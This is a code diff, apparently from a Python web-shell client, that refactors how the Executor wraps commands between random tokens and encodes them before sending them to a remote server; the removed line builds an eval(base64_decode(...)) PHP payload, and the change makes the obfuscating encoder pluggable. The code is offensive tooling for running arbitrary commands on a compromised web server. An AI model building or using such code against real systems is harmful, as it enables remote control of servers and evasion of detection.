@@ -18,6 +18,7 @@ from __future__ import annotations
 
 import base64
 
+from ..encoders import Encoder, base64_encode
 from ..exceptions import ExecutionFailed, NoExecFunction
 from ..utils.strings import random_token
 from .transport import Transport
@@ -43,8 +44,9 @@ _EXEC_BUILDERS = {
 
 
 class Executor:
-    def __init__(self, transport: Transport):
+    def __init__(self, transport: Transport, encoder: Encoder | None = None):
         self.transport = transport
+        self._encode = encoder or base64_encode
         self._disabled: set[str] | None = None
         self._exec_function: str | None = None
 
@@ -61,8 +63,7 @@ class Executor:
         token = random_token()
         code = code.strip().rstrip(";")
         wrapped = f"echo '{token}';{code};echo '{token}';"
-        payload = f"eval(base64_decode('{self._b64(wrapped)}'));"
-        body = self.transport.send(payload)
+        body = self.transport.send(self._encode(wrapped))
         parts = body.split(token)
         if len(parts) < 3:
             raise ExecutionFailed(
